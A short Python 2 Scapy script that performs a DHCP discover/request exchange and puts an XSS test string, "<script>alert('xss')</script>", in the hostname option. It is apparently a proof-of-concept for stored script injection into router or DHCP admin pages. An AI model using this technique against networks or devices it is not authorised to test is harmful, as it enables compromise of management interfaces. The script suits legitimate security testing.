from scapy.all import *
import threading
import time
from enum import IntEnum


interface = 'wlx00'
mac = '00:c0:ca:84:ab:a2'
broadcast = 'ff:ff:ff:ff:ff:ff'
mac_hex = mac.replace(':', '').decode('hex')


class Bootp(IntEnum):
    Discover = 1
    Offer = 2
    Request = 3
    Decline = 4
    Ack  = 5
    Nak = 6
    Release = 7


def dhcp_discover():
    disc_pkt = Ether(src=mac, dst=broadcast) / \
               IP(src='0.0.0.0', dst='255.255.255.255') / \
               UDP(dport=67, sport=68) / BOOTP(chaddr=mac_hex) / \
               DHCP(options=[('message-type', 'discover'), 'end'])

    sendp(disc_pkt, iface=interface)


def dhcp_request(pkt):
    yiaddr = pkt['BOOTP'].yiaddr
    siaddr = '192.168.0.1'
    param_req_list = []
    hostname = "<script>alert('xss')</script>"

    req_pkt =  Ether(src=mac, dst=broadcast)  / \
               IP(src='0.0.0.0', dst='255.255.255.255')  / \
               UDP(dport=67, sport=68) / BOOTP(chaddr=mac_hex)  / \
               DHCP(options=[ ('message-type', 'request'), ('server_id', siaddr), ('requested_addr', yiaddr), ('hostname', hostname), 'end'])

    sendp(req_pkt, iface=interface)                      


def dhcp(pkt):
    print pkt.display()
    print "#############################################################"
    if pkt.haslayer(DHCP) and pkt['DHCP'].options[0][1] == Bootp.Offer:
        dhcp_request(pkt)
    elif pkt.haslayer(DHCP) and pkt['DHCP'].options[0][1] == Bootp.Ack:
        print "Server Acknowledged"
        sys.exit(0)
    elif pkt.haslayer(DHCP) and pkt['DHCP'].options[0][1] == Bootp.Decline:
        print "Server Declined"
        sys.exit(0)
    elif pkt.haslayer(DHCP) and pkt['DHCP'].options[0][1] == Bootp.Nak:
        print "Server Nak"
        sys.exit(0)


def sniff_dhcp():
    print "Sniffing DHCP..."
    sniff(iface=interface, prn=dhcp, filter="port 68 and port 67", timeout=20)
    sys.exit(0)


def main():
    t1 = threading.Thread( target=sniff_dhcp, args=() )
    t1.setDaemon = True
    t1.start()

    time.sleep(1)
    dhcp_discover()

    


if __name__ == "__main__":
    main()
